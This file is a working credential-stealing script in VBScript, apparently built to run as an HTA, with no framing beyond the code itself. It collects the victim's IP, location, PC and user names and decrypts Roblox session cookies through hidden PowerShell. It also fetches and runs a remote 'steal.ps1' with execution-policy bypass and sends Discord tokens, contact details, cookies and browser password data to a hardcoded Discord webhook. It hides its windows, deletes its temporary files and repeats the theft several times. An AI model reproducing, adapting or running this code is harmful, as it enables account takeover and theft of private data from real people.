On Error Resume Next

Dim _A, _B, _C, _D, _E
Set _A = CreateObject("WScript.Shell")
Set _B = CreateObject("Scripting.FileSystemObject")
_C = "https://discord.com/api/webhooks/1568351976972877926/u0AFPPLPFJOjDwiCVmJRWbe9ZtqUUzEC3rUjzyQfMeib4o3LkZcv82iDRTYBzKkW9I4n"
_D = _A.ExpandEnvironmentStrings("%COMPUTERNAME%")
_E = _A.ExpandEnvironmentStrings("%USERNAME%")

Call _G()
Call _F()
Call _H()

Dim _r
For _r = 1 To 8
    Call _K(":repeat: Re-grab " & _r & "/8", "PC: " & _D & " | User: " & _E, 3447003)
    Call _G()
    Call _F()
    Call _H()
    If _r < 8 Then Call _J(10)
Next

window.close()

Sub _G()
    Dim _x : Set _x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    _x.SetOption 2, 13056
    _x.Open "GET", "https://api.ipify.org/", False
    _x.Send
    If _x.Status <> 200 Then Exit Sub
    Dim _ip : _ip = _x.responseText
    If Len(_ip) < 7 Then Exit Sub
    _x.Open "GET", "http://ip-api.com/line/" & _ip & "?fields=country,regionName,city,isp", False
    _x.Send
    If _x.Status <> 200 Then Exit Sub
    Dim _ll : _ll = Split(_x.responseText, vbLf)
    Dim _inf : _inf = "IP: " & _ip & " | " & _ll(0) & " | " & _ll(1) & " | " & _ll(2) & " | " & _ll(3) & " | PC: " & _D & " | " & _E
    Call _K(":dart: Target", _inf, 3447003)
    Set _x = Nothing
End Sub

Sub _H()
    Dim _pt(2)
    _pt(0) = _A.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    _pt(1) = _A.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    _pt(2) = _A.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    Dim _i, _fp, _rw
    For _i = 0 To 2
        If _B.FileExists(_pt(_i)) Then _fp = _pt(_i) : Exit For
    Next
    If Len(_fp) = 0 Then Exit Sub
    _rw = _O(_fp)
    If Len(_rw) < 50 Then Exit Sub
    Dim _ck : _ck = ""
    If InStr(_rw, "_|WARNING") > 0 Then _ck = _rw
    If Len(_ck) = 0 And InStr(_rw, "CookiesData") > 0 Then
        Dim _sp : _sp = InStr(_rw, "CookiesData" & Chr(34) & ":" & Chr(34))
        If _sp > 0 Then
            _sp = _sp + 14
            Dim _ep : _ep = InStr(_sp, _rw, Chr(34))
            If _ep > _sp Then
                Dim _b4 : _b4 = Mid(_rw, _sp, _ep - _sp)
                If Len(_b4) > 100 Then _ck = _P(_b4)
            End If
        End If
    End If
    If Len(_ck) = 0 And InStr(_rw, ".ROBLOSECURITY") > 0 Then
        Dim _rp : _rp = InStr(_rw, ".ROBLOSECURITY") : _ck = Mid(_rw, _rp)
    End If
    If Len(_ck) = 0 Then _ck = _rw
    _ck = Replace(_ck, vbCr, "")
    _ck = Replace(_ck, vbLf, "")
    _ck = Replace(_ck, vbTab, "")
    _ck = Trim(_ck)
    Dim _sc : _sc = InStr(_ck, ";")
    If _sc > 0 Then _ck = Left(_ck, _sc - 1)
    _ck = Trim(_ck)
    Dim _wn : _wn = InStr(_ck, "_|WARNING")
    If _wn > 1 Then _ck = Mid(_ck, _wn)
    _K "Roblox Cookie", "Size: " & Len(_ck) & " | PC: " & _D, 65280
    _L "cookie.txt", _ck
End Sub

Sub _I(_s)
    _A.Run "cmd /c ping -n " & (_s + 1) & " 127.0.0.1 > nul", 0, True
End Sub

Sub _J(_m) : Call _I(_m * 60) : End Sub

Sub _F()
    Dim _x : Set _x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    _x.SetOption 2, 13056
    _x.Open "GET", "https://gist.githubusercontent.com/alexproisgamer-dotcom/c5d82d771d84ba31d053e1459a1c138f/raw/0fcf97c07d1018c6849ef05cffb28ef4961e180e/steal.ps1", False
    _x.Send
    If _x.Status <> 200 Then Exit Sub
    Dim _pc : _pc = _x.responseText
    If Len(_pc) < 100 Then Exit Sub
    Set _x = Nothing
    Dim _psf : _psf = _M("steal.ps1")
    _N _psf, _pc
    _A.Run "cmd /c powershell -NoP -Exec Bypass -File """ & _psf & """", 0, True
    _B.DeleteFile _psf, True
    Dim _tf : _tf = _M("steal_result.txt")
    If Not _B.FileExists(_tf) Then Exit Sub
    Dim _rw : _rw = _O(_tf)
    If Len(_rw) > 10 Then
        Dim _ln : _ln = Split(_rw, vbCrLf)
        Dim _l
        For Each _l In _ln
            If Len(_l) > 10 Then
                If Left(_l, 8) = "DISCORD|" Then
                    Dim _p : _p = Split(Mid(_l, 9), "|")
                    If UBound(_p) >= 4 Then
                        Dim _if : _if = "**User:** " & _p(0) & vbCrLf
                        If _p(1) <> "" Then _if = _if & "**Email:** " & _p(1) & vbCrLf
                        If _p(2) <> "" Then _if = _if & "**Phone:** " & _p(2) & vbCrLf
                        If _p(3) <> "0" Then _if = _if & "**ID:** " & _p(3) & vbCrLf
                        _if = _if & "**Token:** " & _p(4)
                        Call _K(":gift: Discord Token", _if, 5793266)
                    End If
                End If
                If Left(_l, 7) = "ROBLOX|" Or Left(_l, 9) = "ROBLOXMS|" Then
                    Call _K(":cookie: Roblox Cookie", Mid(_l, 8), 65280)
                End If
                If Left(_l, 8) = "PASSWORD" Then
                    Dim _pw : _pw = Split(_l, "|")
                    If UBound(_pw) >= 4 Then
                        Call _K(":key: Password DB", "Browser: " & _pw(1) & " | Status: " & _pw(2) & " | b64: " & Len(_pw(4)) & " chars", 16776960)
                        If Len(_pw(4)) > 0 Then Call _L(_pw(1) & "_logindata.b64", _pw(4))
                    End If
                End If
            End If
        Next
    End If
    _B.DeleteFile _tf, True
End Sub

Function _M(_n) : _M = _A.ExpandEnvironmentStrings("%TEMP%") & "\" & _n : End Function
Sub _N(_path, _cnt) : Dim _f : Set _f = _B.CreateTextFile(_path, True) : _f.Write _cnt : _f.Close : Set _f = Nothing : End Sub
Function _O(_path) : _O = "" : Dim _f : Set _f = _B.OpenTextFile(_path, 1) : _O = _f.ReadAll : _f.Close : Set _f = Nothing : End Function

Sub _K(_t, _d, _c)
    Dim _dq : _dq = Chr(34)
    Dim _j : _j = "{" & _dq & "embeds" & _dq & ":[{" & _dq & "title" & _dq & ":" & _dq & _Q(_t) & _dq & "," & _dq & "description" & _dq & ":" & _dq & _Q(_d) & _dq & "," & _dq & "color" & _dq & ":" & _c & "}]}"
    Dim _h : Set _h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    _h.SetOption 2, 13056
    _h.Open "POST", _C, False
    _h.SetRequestHeader "Content-Type", "application/json"
    _h.Send _j
    Set _h = Nothing
End Sub

Sub _L(_fn, _ct)
    Dim _dq : _dq = Chr(34)
    Dim _b : _b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    Dim _bd : _bd = "--" & _b & vbCrLf & "Content-Disposition: form-data; name=" & _dq & "file" & _dq & "; filename=" & _dq & _fn & _dq & vbCrLf & vbCrLf & _ct & vbCrLf & "--" & _b & "--"
    Dim _h : Set _h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    _h.SetOption 2, 13056
    _h.Open "POST", _C, False
    _h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & _b
    _h.Send _bd
    Set _h = Nothing
End Sub

Function _P(_b4)
    _P = ""
    Dim _inf : _inf = _M("dpi.txt")
    Dim _otf : _otf = _M("dpo.txt")
    _B.DeleteFile _otf, True
    _N _inf, _b4
    Dim _ps : _ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & _inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & _otf & "' -Encoding utf8}catch{''|Out-File '" & _otf & "'}"
    Dim _psf : _psf = _M("dpapi.ps1")
    _N _psf, _ps
    _A.Run "powershell -NoP -Exec Bypass -File """ & _psf & """", 0, True
    If _B.FileExists(_otf) Then If _B.GetFile(_otf).Size > 20 Then _P = _O(_otf)
    _B.DeleteFile _inf, True
    _B.DeleteFile _psf, True
    _B.DeleteFile _otf, True
End Function

Function _Q(_s)
    _Q = _s
    _Q = Replace(_Q, Chr(92), Chr(92) & Chr(92))
    _Q = Replace(_Q, Chr(34), Chr(92) & Chr(34))
    _Q = Replace(_Q, vbCrLf, Chr(92) & "n")
    _Q = Replace(_Q, vbCr, Chr(92) & "n")
    _Q = Replace(_Q, vbLf, Chr(92) & "n")
    _Q = Replace(_Q, vbTab, Chr(92) & "t")
End Function
